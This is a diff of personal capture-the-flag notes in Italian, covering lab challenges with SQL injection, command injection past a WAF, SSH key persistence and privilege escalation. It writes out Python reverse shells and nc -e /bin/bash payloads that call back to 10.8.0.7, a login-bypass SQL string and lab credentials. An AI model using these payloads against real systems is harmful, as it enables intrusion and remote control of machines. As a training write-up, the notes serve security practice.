@@ -92,7 +92,6 @@ siamo entrati nella macchina con ssh e usando le credenziali
 
 ![[Pasted image 20260622104253.png]]
 
-
 uso ssh publica da mettere dentro d.truck
 `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDzj1z9yEmzPjD/+94QMzQPD/9COGpecuF0KGcUDvdZn kali@kali`
 
@@ -104,12 +103,70 @@ accedo con
 `/usr/bin/python3 /usr/bin/crypto/task `
 ![[Pasted image 20260622112631.png]]
 
-```Python
-socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.8.0.7",9999));
-os.dup2(s.fileno(),0); 
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-import pty; pty.spawn("sh")
+
+![[Pasted image 20260622122331.png]]
+
+`VDSI{C0nsp1r4cy_Th30ry_R34ch3d_R00t}`
+ho trovato socat come sudo -l
+che posso eseguire senza passwd
+
+#### CHALLENGE A SE
+
+ip target lo stesso ma con porta 
+`58090`
+sono entrato facendo sql injection di tipo in band
+`' OR '1'='1`
+
+`VDSI{SQLi_Byp4ss_D14gn0st1cs}`
+
+`";"nc 10.8.0.7 4444 -e /bin/bash"`
+
+`"%3B"nc 10.8.0.7 4444 -e /bin/bash"`
+
+
+ho modificato il file html e ho eseguito
+
+togliendo la chiamata a validate form
+
+```python
+; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+`VDSI{Cmd_Inj3ct10n_WAF_Byp4ss3d}`
+
+
+#### Challenge a se 2
+
+`porta 58022` come utente `student` con password `student123`
+
+![[Pasted image 20260622131719.png]]
+
+path trovato con 
+```scss
+student@fc2bb2d67818:/usr/bin/crypto$ cat task
+#!/usr/bin/env python3
+import random
+import os
+
+# Some dummy operation
+crypto_val = random.randint(10000, 99999) if hasattr(random, 'randint') else "INIT"
+
+try:
+    with open("/var/backups/generated/l4st.k3y", "w") as f:
+        f.write(f"KEY_GEN_{crypto_val}\n")
+except:
+    pass
+
+```
+
+ho provato a fare path hijacking sarebbe andato così
+
+```scss
+import socket,subprocess,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.8.0.7",4444))
+os.dup2(s.fileno(),0)
+ os.dup2(s.fileno(),1)
+ os.dup2(s.fileno(),2)
+ pty.spawn("/bin/bash")'
 ```
